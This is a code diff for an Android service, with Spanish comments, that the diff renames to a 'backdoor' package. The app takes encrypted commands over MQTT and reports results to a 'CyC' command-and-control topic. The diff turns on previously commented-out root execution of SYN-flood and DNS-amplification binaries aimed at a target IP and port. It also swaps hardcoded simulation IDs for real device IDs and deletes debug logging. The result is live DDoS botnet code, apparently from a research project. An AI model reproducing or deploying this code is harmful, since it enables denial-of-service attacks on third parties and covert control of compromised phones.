@@ -1,4 +1,4 @@
-package com.gshp.mqttpersistencev2;
+package com.iote.backdoor;
 
 import android.annotation.SuppressLint;
 import android.app.Notification;
@@ -7,15 +7,12 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.graphics.Color;
 import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
-
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
-
 import org.eclipse.paho.android.service.MqttAndroidClient;
 import org.eclipse.paho.client.mqttv3.IMqttActionListener;
 import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken;
@@ -26,7 +23,6 @@ import org.eclipse.paho.client.mqttv3.MqttException;
 import org.eclipse.paho.client.mqttv3.MqttMessage;
 import org.json.JSONException;
 import org.json.JSONObject;
-
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
@@ -37,7 +33,6 @@ import java.security.Key;
 import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
 import java.util.UUID;
-
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
@@ -60,43 +55,45 @@ class MyThread implements Runnable { //Hilo implementado para crear inundación 
         this.clientSyn = client;
         t = new Thread(this);
         t.start(); // Empieza el hilo
-        
     }
 
-    // execution of thread starts from run() method
     public void run()
     {
         while (!Thread.interrupted()) {
 
-
             final String[] str = {""};
             final StringBuffer sb =  new StringBuffer();
             String id = MqttApplication.sharedPreferences.getString("ID","-");
-            id = "73059017-c2c8-43af-9c48-41481c6dec85"; //SIMULACIÓN
+            int firstTime = MqttApplication.sharedPreferences.getInt("FIRST_TIME",1);
+            //id = "73059017-c2c8-43af-9c48-41481c6dec85"; //SIMULACIÓN
             //id = "19e46b97-80b6-45f3-838e-785f69102a96"; //SIMULACIÓN
-            int firstTime = 0; //SIMULACIÓN
+            //int firstTime = 0; //SIMULACIÓN
             Blowfish blowfish = new Blowfish();
             ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
             final String encryptKey = UUID.randomUUID().toString().replace("-", "").substring(0, 4);
 
             try
             {
-
                    if(this.DoS == 1){
-                       /*Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/multiSyn " + this.IPDestino + " " + this.puertoDestino});// Syn fl
+                       Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/multiSyn " + this.IPDestino + " " + this.puertoDestino});// Syn fl
                        BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                        while((str[0] = inputStream.readLine())!= null){
                            sb.append(str[0]);
-                       }*/
-                       Log.d("DDoS", "run: >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>SYN");
-
+                       }
+                       String consulta = sb.toString();
+                       byte[] bytes = consulta.getBytes();
+                       MqttMessage mqttMessage = new MqttMessage(bytes);
+                       this.clientSyn.publish("CyC", mqttMessage);
                    }else if (this.DoS == 2){
-                       /*Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/ampDns " + this.IPDestino + " " + this.puertoDestino});// Syn fl
+                       Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/ampDns " + this.IPDestino + " " + this.puertoDestino});// Syn fl
                        BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                        while((str[0] = inputStream.readLine())!= null){
                            sb.append(str[0]);
-                       }*/
-                       Log.d("DDoS", "run: >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>AMP/DNS");
+                       }
+                       String consulta = sb.toString();
+                       byte[] bytes = consulta.getBytes();
+                       MqttMessage mqttMessage = new MqttMessage(bytes);
+                       this.clientSyn.publish("CyC", mqttMessage);
                    }
 
             } catch (Exception e) {
@@ -111,6 +108,7 @@ class MyThread implements Runnable { //Hilo implementado para crear inundación 
 
                 String errorMessage = "Error (3): Sin acceso como SU.";
                 String deviceInfo = "";
+
                 if(this.DoS == 1){
                     deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+errorMessage+"\"}"+firstTime+"&";
                 }else if(this.DoS == 2){
@@ -132,14 +130,10 @@ class MyThread implements Runnable { //Hilo implementado para crear inundación 
                 } catch (MqttException errorMQTT) {
                     errorMQTT.printStackTrace();
                 }
-                
             }
-
         }
-        //System.out.println("Thread has stopped.");
     }
 }
-
 
 public class MqttConnectionManagerService extends Service {
 
@@ -151,8 +145,7 @@ public class MqttConnectionManagerService extends Service {
     final boolean dosFloodSyn = MqttApplication.sharedPreferences.getBoolean("DOS_FLOOD_SYN", false);
     final boolean dosAmpDns = MqttApplication.sharedPreferences.getBoolean("DOS_AMP_DNS", false);
 
-    MyThread t1; //Para matar proceso del case 10,13
-
+    MyThread t1; //Para terminar proceso del case 10,13
 
     @SuppressLint("WrongConstant")
     @Override
@@ -238,15 +231,11 @@ public class MqttConnectionManagerService extends Service {
 
                 @Override
                 public void messageArrived(String topic, MqttMessage message) throws MqttException, NoSuchPaddingException, NoSuchAlgorithmException, JSONException, IOException {
-                    Log.d(TAG, "messageArrived: Topic: " + topic + " Message: " + message);
 
                     String s = String.valueOf(message);
-                    //Descifrando el mensaje
-
                     String decryptionKey = s.substring(0, 4);
                     String encryptedPayload = s.substring(4);
                     Log.d(TAG, "Subllave: "+decryptionKey);
-
                     Cipher cipher = Cipher.getInstance("Blowfish/ECB/PKCS5Padding");
                     Key blowfishKey = new SecretKeySpec(decryptionKey.getBytes(), "Blowfish");
 
@@ -281,10 +270,8 @@ public class MqttConnectionManagerService extends Service {
 
                     final StringBuffer sb = new StringBuffer();
                     final String[] str = {""};
-
-                    //String id = "19e46b97-80b6-45f3-838e-785f69102a96"; //SIMULACIÓN
-                    String id = "73059017-c2c8-43af-9c48-41481c6dec85"; //SIMULACIÓN
-                    int firstTime = 0; //SIMULACIÓN
+                    //String id = "73059017-c2c8-43af-9c48-41481c6dec85"; //SIMULACIÓN
+                    //int firstTime = 0; //SIMULACIÓN
                     final String encryptKey = UUID.randomUUID().toString().replace("-", "").substring(0, 4);
 
                     switch (Integer.parseInt(splited[0]))
@@ -809,11 +796,6 @@ public class MqttConnectionManagerService extends Service {
 
                         case 13:
 
-                            /*String consultaFinal = "{'dispositivo':'"+ id +"', 'valor': 'Detenido','campo': 'Tarea Programada/Servicio'}";
-                            byte[] bytes = consultaFinal.getBytes();
-                            MqttMessage mqttMessage = new MqttMessage(bytes);
-                            client.publish("CyC", mqttMessage);*/
-
                             String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"11\", \"value\": \"Inactivo\"}"+firstTime+"&";
 
                             //Cifrando
@@ -860,17 +842,13 @@ public class MqttConnectionManagerService extends Service {
             token.setActionCallback(new IMqttActionListener() {
                 @Override
                 public void onSuccess(IMqttToken asyncActionToken) {
-                    Log.d(TAG, "onSuccess: Successfully connected to broker!!!");
                     try {
                         client.subscribe("test", 0, null, new IMqttActionListener() {
                             @Override
                             public void onSuccess(IMqttToken asyncActionToken) {
-                                Log.d(TAG, "onSuccess:  Successfully subscribed to topic!!!");
                             }
-
                             @Override
                             public void onFailure(IMqttToken asyncActionToken, Throwable exception) {
-
                             }
                         });
                     } catch (MqttException e) {
@@ -880,20 +858,17 @@ public class MqttConnectionManagerService extends Service {
 
                 @Override
                 public void onFailure(IMqttToken asyncActionToken, Throwable exception) {
-                    Log.d(TAG, "onFailure");
                 }
             });
 
-            //=========================================================================== simulación !!!!!!
+            //=========================================================================== SIMULACIÓN
             token2.setActionCallback(new IMqttActionListener() {
                 @Override
                 public void onSuccess(IMqttToken asyncActionToken) {
-                    Log.d(TAG, "onSuccess: Successfully connected to broker2!!!");
                     try {
                         client.subscribe("test", 0, null, new IMqttActionListener() {
                             @Override
                             public void onSuccess(IMqttToken asyncActionToken) {
-                                Log.d(TAG, "onSuccess:  Successfully subscribed to topic2!!!");
                             }
 
                             @Override
@@ -908,7 +883,6 @@ public class MqttConnectionManagerService extends Service {
 
                 @Override
                 public void onFailure(IMqttToken asyncActionToken, Throwable exception) {
-                    Log.d(TAG, "onFailure2");
                 }
             });
         } catch (MqttException e) {
@@ -921,12 +895,9 @@ public class MqttConnectionManagerService extends Service {
 
         try {
             client.unsubscribe("test");
-            Log.d(TAG, "onSuccess:  Successfully Unsubscribed to topic!!!");
         } catch (MqttException e) {
             e.printStackTrace();
-            Log.d(TAG, "onFail:  Failed to Unsubscribed");
         }
-
 
         Intent broadcastIntent = new Intent();
         broadcastIntent.setAction("restartService");
